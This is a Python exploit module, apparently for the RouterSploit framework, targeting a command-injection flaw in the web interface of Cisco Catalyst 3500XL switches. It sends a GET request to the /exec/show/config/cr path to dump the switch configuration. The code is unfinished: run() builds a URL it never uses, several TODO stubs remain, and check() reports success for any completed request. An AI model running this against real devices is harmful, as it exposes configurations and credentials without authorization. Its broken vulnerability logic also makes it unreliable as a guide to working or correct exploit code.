# -*- coding:utf-8 -*-
# Why didn't add above line in HTTP PoC(s)?!
from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    print_status,
    http_request,
    mute,
    validators,
)

class Exploit(exploits.Exploit):
    """
    For Cisco 3500xl catalyst
    """
    __info__ = {
        'name': 'Cisco catalyst 3500xl switch remote arbitrary command injection',
        'description': ['A vulnerability exists in the Cisco Catalyst web interface \n'
                        'management that could allow an authenticated user to inject \n'
                        'arbitrary commands. ',
                        ],
        'authors': [
            'BlackAngels' 
        ],
        'references': [
            'https://www.securityfocus.com/bid/4711/info',
        ],
        'devices': [
            'Cisco Catalyst 3500XL Switchs',
        ],
        'id': 'sf-4771-7',
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1',
                             validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port
    path_to_read = exploits.Option('/show/config/cr',
                                   'Read file path')
    response = None
    entry = 'exec'

    # TODO: UNITEST - FUNC TEST - CASE 04 -- Exploit Test
    def run(self):
        if self.check() != 0:
            # TODO: UNITEST - FUNC TEST - CASE 03 -- Check func test
            url = "{}:{}/{}/{}".format(self.target, self.port, self.entry, self.path_to_read)
            # TODOï¼š Capture response data
            if self.response is not None:
                return True
            else:
                return False  # target is not vulnerable
        else:
            print_status("Something wrong ... Oops")
            return False

    @mute
    def check(self):
        # TODO: UNITEST - FUNC TEST - CASE 03 -- Check func test
        url = "{}:{}/{}/{}".format(self.target, self.port, self.entry, self.path_to_read)
        try:
            self.response = http_request(method="GET", url=url)
        except Exception:
            return 0  # Not ensure
        return True
